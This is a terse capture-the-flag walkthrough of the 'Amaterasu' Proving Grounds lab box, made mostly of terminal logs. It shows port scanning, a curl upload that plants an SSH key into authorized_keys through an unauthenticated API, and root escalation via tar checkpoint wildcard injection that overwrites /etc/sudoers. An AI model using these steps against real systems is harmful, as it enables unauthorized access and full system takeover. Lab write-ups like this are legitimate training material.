参考资料：
 
192.168.243.249
 
[https://sanaullahamankorai.medium.com/amaterasu-15f18dc55609](https://sanaullahamankorai.medium.com/amaterasu-15f18dc55609)  
[https://medium.com/@rizzziom/amaterasu-walkthrough-proving-ground-6c458abda9e3](https://medium.com/@rizzziom/amaterasu-walkthrough-proving-ground-6c458abda9e3)  
[https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
   

┌──(kali㉿kali)-[~/Desktop/pg02/Amaterasu]  
└─$ nmap -sS 192.168.243.249  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-19 01:18 EST  
Nmap scan report for 192.168.243.249  
Host is up (0.081s latency).  
Not shown: 992 filtered tcp ports (no-response)  
PORT STATE SERVICE  
21/tcp open ftp  
22/tcp closed ssh  
111/tcp closed rpcbind  
139/tcp closed netbios-ssn  
443/tcp closed https  
445/tcp closed microsoft-ds  
2049/tcp closed nfs  
10000/tcp closed snet-sensor-mgmt
 
Nmap done: 1 IP address (1 host up) scanned in 5.48 seconds   ┌──(kali㉿kali)-[~/Desktop/pg02/Amaterasu]  
└─$
    
[http://192.168.243.249:40080/](http://192.168.243.249:40080/)
    
[http://192.168.243.249:33413/info](http://192.168.243.249:33413/info)
    
[http://192.168.243.249:33414/file-list?dir=/home/alfredo](http://192.168.243.249:33414/file-list?dir=/home/alfredo)
     ┌──(kali㉿kali)-[~/Desktop/pg02/Amaterasu]  
└─$  
cat id_rsa.pub \>id_rsa.txt
 
curl -i -L -X POST -H "Content-Type: multipart/form-data" -F file="@//home/kali/.ssh/id_rsa.txt" -F filename="/home/alfredo/.ssh/authorized_keys" [http://192.168.243.249:33414/file-upload](http://192.168.243.249:33414/file-upload)
   

HTTP/1.1 201 CREATED  
Server: Werkzeug/2.2.3 Python/3.9.13  
Date: Wed, 19 Nov 2025 08:23:39 GMT  
Content-Type: application/json  
Content-Length: 41  
Connection: close
 
{"message":"File successfully uploaded"}   ┌──(kali㉿kali)-[~/Desktop/pg02/Amaterasu]  
└─$
 
siyaodenglu  
┌──(kali㉿kali)-[~/.ssh]  
└─$ ssh alfredo@192.168.243.249 -p 25022 -i id_rsa  
Last failed login: Wed Nov 19 03:24:03 EST 2025 from 192.168.45.176 on ssh:notty  
There were 8 failed login attempts since the last successful login.  
Last login: Tue Mar 28 03:21:25 2023  
[alfredo@fedora ~]$  
[alfredo@fedora ~]$ ls  
local.txt restapi  
[alfredo@fedora ~]$ cat local.txt  
4d9ae8bd5dcb67003f045772a3213c8d  
[alfredo@fedora ~]$
   

[alfredo@fedora ~]$  
[alfredo@fedora ~]$ find / -user root -perm -u=s -ls 2\>/dev/null  
25343651 40 -rwsr-xr-x 1 root root 36904 Jan 26 2021 /usr/bin/fusermount  
25198885 76 -rwsr-xr-x 1 root root 74208 Nov 30 2021 /usr/bin/chage  
25198886 80 -rwsr-xr-x 1 root root 78536 Nov 30 2021 /usr/bin/gpasswd  
25198889 44 -rwsr-xr-x 1 root root 42256 Nov 30 2021 /usr/bin/newgrp  
25581531 60 -rwsr-xr-x 1 root root 58384 Feb 12 2021 /usr/bin/su  
25581515 52 -rwsr-xr-x 1 root root 49920 Feb 12 2021 /usr/bin/mount  
25581534 40 -rwsr-xr-x 1 root root 37560 Feb 12 2021 /usr/bin/umount  
25622180 32 -rwsr-xr-x 1 root root 32624 Feb 16 2022 /usr/bin/pkexec  
26104487 56 -rwsr-xr-x 1 root root 53744 Mar 29 2021 /usr/bin/crontab  
25167404 40 -rwsr-xr-x 1 root root 36912 Jun 15 2021 /usr/bin/fusermount3  
26032468 184 ---s--x--x 1 root root 185504 Jan 26 2021 /usr/bin/sudo  
26032248 32 -rwsr-xr-x 1 root root 32712 Jan 30 2021 /usr/bin/passwd  
26032254 36 -rws--x--x 1 root root 33488 Feb 12 2021 /usr/bin/chfn  
26032255 28 -rws--x--x 1 root root 25264 Feb 12 2021 /usr/bin/chsh  
26032388 60 -rwsr-xr-x 1 root root 57432 Jan 25 2021 /usr/bin/at  
25326362 120 ---s--x--- 1 root stapusr 120656 Dec 7 2021 /usr/bin/staprun  
422020 16 -rwsr-xr-x 1 root root 15624 Dec 10 2021 /usr/sbin/grub2-set-bootflag  
140107 16 -rwsr-xr-x 1 root root 16096 Jan 17 2022 /usr/sbin/pam_timestamp_check  
140109 24 -rwsr-xr-x 1 root root 24520 Jan 17 2022 /usr/sbin/unix_chkpwd  
554128 116 -rwsr-xr-x 1 root root 116064 Sep 23 2021 /usr/sbin/mount.nfs  
25622521 24 -rwsr-xr-x 1 root root 24504 Feb 16 2022 /usr/lib/polkit-1/polkit-agent-helper-1  
17150458 60 -rwsr-x--- 1 root cockpit-wsinstance 57608 Feb 2 2022 /usr/libexec/cockpit-session  
[alfredo@fedora ~]$  
[alfredo@fedora ~]$ cd restapi/  
[alfredo@fedora restapi]$ ls  
app.py main.py __pycache__  
[alfredo@fedora restapi]$ echo "" \> '--checkpoint=1'  
[alfredo@fedora restapi]$ echo "" \> '--checkpoint-action=exec=sh exploit.sh'
 
vi explopit.sh  
echo 'alfredo ALL=(root) NOPASSWD: ALL' \> /etc/sudoers
 
[alfredo@fedora restapi]$ sudo -i  
[root@fedora ~]# ls  
anaconda-ks.cfg build.sh proof.txt run.sh  
[root@fedora ~]# cat proof.txt  
5fb89c95d23c3a01b886cdbbff25eb01  
[root@fedora ~]#